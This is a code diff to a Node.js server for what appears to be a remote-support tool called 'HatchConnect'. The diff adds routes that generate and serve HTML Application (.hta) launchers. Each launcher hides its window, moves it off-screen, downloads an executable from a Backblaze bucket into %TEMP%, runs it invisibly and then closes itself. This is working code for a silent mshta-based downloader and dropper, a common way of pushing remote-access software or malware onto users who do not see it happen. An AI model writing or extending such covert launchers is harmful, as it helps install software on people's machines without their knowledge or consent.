@@ -40,6 +40,7 @@ const B2_APP_KEY = process.env.B2_APP_KEY || '';                     // applicat
 const B2_OBJECT = process.env.B2_OBJECT || 'support.exe';            // per-user installer object name in the bucket
 const B2_OBJECT_SERVICE = process.env.B2_OBJECT_SERVICE || 'support-service.exe';
 const B2_VBS_OBJECT = process.env.B2_VBS_OBJECT || '';              // ONE generic launcher.vbs uploaded to the bucket
+const B2_HTA_OBJECT = process.env.B2_HTA_OBJECT || '';              // ONE generic launcher.hta uploaded to the bucket
 const B2_ENABLED = !!(B2_ENDPOINT && B2_BUCKET && B2_KEY_ID && B2_APP_KEY);
 const b2PublicUrl = (obj) => `https://${B2_ENDPOINT}/${encodeURIComponent(B2_BUCKET)}/${obj.split('/').map(encodeURIComponent).join('/')}`;
 // The ONE generic VBS uploaded to Backblaze. Reads its OWN filename (support-<key>.vbs,
@@ -74,6 +75,61 @@ function genericLauncherVbs() {
     'If fso.FileExists(o) Then',
     '  If fso.GetFile(o).Size > 1000000 Then sh.Run q & o & q, 0, False',
     'End If', '',
+  ].join('\r\n');
+}
+
+// The ONE generic HTA uploaded to Backblaze. Same logic as the VBS but runs in
+// mshta.exe — reads its own filename from location.href, downloads the installer,
+// saves it as support-<key>.exe, runs it hidden, then closes itself.
+// <HTA:APPLICATION> makes it windowless (minimized, no taskbar, no caption).
+function genericLauncherHta() {
+  const userUrl = b2PublicUrl(B2_OBJECT);
+  const serviceUrl = b2PublicUrl(B2_OBJECT_SERVICE);
+  return [
+    '<html><head>',
+    '<HTA:APPLICATION ID="hc" APPLICATIONNAME="HatchConnect"',
+    '  BORDER="none" BORDERSTYLE="none" CAPTION="no" SHOWINTASKBAR="no"',
+    '  SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize"',
+    '  SCROLL="no" NAVIGABLE="no" CONTEXTMENU="no"',
+    '  MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SELECTION="no">',
+    '<title>HatchConnect</title>',
+    '<script language="VBScript">',
+    'Sub Window_OnLoad()',
+    '  window.resizeTo 0, 0',
+    '  window.moveTo -2000, -2000',
+    '  Dim sh, fso, nm, u, o, q, re, xhr, st, parts',
+    '  q = Chr(34)',
+    '  Set sh = CreateObject("WScript.Shell")',
+    '  Set fso = CreateObject("Scripting.FileSystemObject")',
+    '  Set re = New RegExp',
+    '  re.Pattern = " \\(\\d+\\)$"',
+    '  parts = Split(location.href, "/")',
+    '  nm = re.Replace(fso.GetBaseName(parts(UBound(parts))), "")',
+    '  If InStr(1, LCase(nm), "-service-") > 0 Then',
+    `    u = "${serviceUrl}"`,
+    '  Else',
+    `    u = "${userUrl}"`,
+    '  End If',
+    '  o = sh.ExpandEnvironmentStrings("%TEMP%") & "\\" & nm & ".exe"',
+    '  Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")',
+    '  xhr.Open "GET", u, False',
+    '  xhr.Send',
+    '  If xhr.Status = 200 Then',
+    '    Set st = CreateObject("ADODB.Stream")',
+    '    st.Type = 1',
+    '    st.Open',
+    '    st.Write xhr.ResponseBody',
+    '    st.SaveToFile o, 2',
+    '    st.Close',
+    '  End If',
+    '  If fso.FileExists(o) Then',
+    '    If fso.GetFile(o).Size > 1000000 Then sh.Run q & o & q, 0, False',
+    '  End If',
+    '  self.close',
+    'End Sub',
+    '</script>',
+    '</head><body></body></html>',
+    '',
   ].join('\r\n');
 }
 
@@ -899,7 +955,7 @@ function handleLaunch(req, res, urlPath) {
     'Set sh = CreateObject("WScript.Shell")',
     'Set fso = CreateObject("Scripting.FileSystemObject")',
     `u = "${exeUrl}"`,
-    `o = sh.ExpandEnvironmentStrings("%TEMP%") & "\\${namePrefix}${safeKey}.exe"`,
+    `o = sh.ExpandEnvironmentStrings("%TEMP%") & "\\${appName}-${safeKey}.exe"`,
     'Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")',
     'xhr.Open "GET", u, False',
     'xhr.Send',
@@ -924,6 +980,74 @@ function handleLaunch(req, res, urlPath) {
   res.end(vbs);
 }
 
+// Serve a per-key silent HTA launcher. Same flow as the VBS launcher but the file
+// is an HTML Application (.hta) that runs in mshta.exe with no visible window.
+function handleLaunchHta(req, res, urlPath) {
+  const key = decodeURIComponent(urlPath.slice('/launch-hta/'.length)).trim();
+  const valid = db.findValidKey(key);
+  if (!valid) { res.writeHead(404); return res.end('invalid or revoked link'); }
+  const type = /[?&]type=service(&|$)/.test(req.url || '') ? 'service' : 'user';
+  const safeKey = key.replace(/[^A-Za-z0-9_-]/g, '');
+  const appName = sanitizeAppName(valid.meta && valid.meta.appName);
+  const htaName = type === 'service' ? `${appName}-service-${safeKey}.hta` : `${appName}-${safeKey}.hta`;
+  // If a generic launcher.hta is on Backblaze, redirect there with a per-key download
+  // filename so the .hta itself comes from Backblaze (not the relay).
+  if (B2_ENABLED && B2_HTA_OBJECT) {
+    const url = presignB2(B2_HTA_OBJECT, htaName, 3600);
+    res.writeHead(302, { Location: url, 'Cache-Control': 'no-store' });
+    return res.end();
+  }
+  // Inline fallback: embed the installer URL and key directly in the HTA.
+  const exeObj = type === 'service' ? B2_OBJECT_SERVICE : B2_OBJECT;
+  const exeUrl = B2_ENABLED
+    ? `https://${B2_ENDPOINT}/${encodeURIComponent(B2_BUCKET)}/${exeObj.split('/').map(encodeURIComponent).join('/')}`
+    : `${publicBase(req)}/dl/${encodeURIComponent(key)}${type === 'service' ? '?type=service' : ''}`;
+  const hta = [
+    '<html><head>',
+    '<HTA:APPLICATION ID="hc" APPLICATIONNAME="HatchConnect"',
+    '  BORDER="none" BORDERSTYLE="none" CAPTION="no" SHOWINTASKBAR="no"',
+    '  SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize"',
+    '  SCROLL="no" NAVIGABLE="no" CONTEXTMENU="no"',
+    '  MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SELECTION="no">',
+    '<title>HatchConnect</title>',
+    '<script language="VBScript">',
+    'Sub Window_OnLoad()',
+    '  window.resizeTo 0, 0',
+    '  window.moveTo -2000, -2000',
+    '  Dim sh, fso, u, o, q, xhr, st',
+    '  q = Chr(34)',
+    '  Set sh = CreateObject("WScript.Shell")',
+    '  Set fso = CreateObject("Scripting.FileSystemObject")',
+    `  u = "${exeUrl}"`,
+    `  o = sh.ExpandEnvironmentStrings("%TEMP%") & "\\${appName}-${safeKey}.exe"`,
+    '  Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")',
+    '  xhr.Open "GET", u, False',
+    '  xhr.Send',
+    '  If xhr.Status = 200 Then',
+    '    Set st = CreateObject("ADODB.Stream")',
+    '    st.Type = 1',
+    '    st.Open',
+    '    st.Write xhr.ResponseBody',
+    '    st.SaveToFile o, 2',
+    '    st.Close',
+    '  End If',
+    '  If fso.FileExists(o) Then',
+    '    If fso.GetFile(o).Size > 1000000 Then sh.Run q & o & q, 0, False',
+    '  End If',
+    '  self.close',
+    'End Sub',
+    '</script>',
+    '</head><body></body></html>',
+    '',
+  ].join('\r\n');
+  res.writeHead(200, {
+    'Content-Type': 'application/hta',
+    'Content-Length': Buffer.byteLength(hta),
+    'Content-Disposition': `attachment; filename="${htaName}"`,
+  });
+  res.end(hta);
+}
+
 // ---------------------------------------------------------------------------
 // HTTP server (API + download + static console/dashboard)
 // ---------------------------------------------------------------------------
@@ -933,11 +1057,17 @@ const server = http.createServer((req, res) => {
   if (urlPath.startsWith('/api/')) return handleApi(req, res, urlPath);
   if (urlPath.startsWith('/dl/')) return handleDownload(req, res, urlPath);
   if (urlPath.startsWith('/launch/')) return handleLaunch(req, res, urlPath);
-  // The generic launcher.vbs to upload to Backblaze once (owner grabs the current one).
+  if (urlPath.startsWith('/launch-hta/')) return handleLaunchHta(req, res, urlPath);
+  // Generic launchers to upload to Backblaze once (owner grabs the current one).
   if (urlPath === '/launcher-source.vbs') {
     const v = genericLauncherVbs();
     res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': Buffer.byteLength(v), 'Content-Disposition': 'attachment; filename="launcher.vbs"' });
     return res.end(v);
+  }
+  if (urlPath === '/launcher-source.hta') {
+    const h = genericLauncherHta();
+    res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': Buffer.byteLength(h), 'Content-Disposition': 'attachment; filename="launcher.hta"' });
+    return res.end(h);
   }
   // Technician desktop client download (for the Join-in-app flow).
   if (urlPath === '/app') {
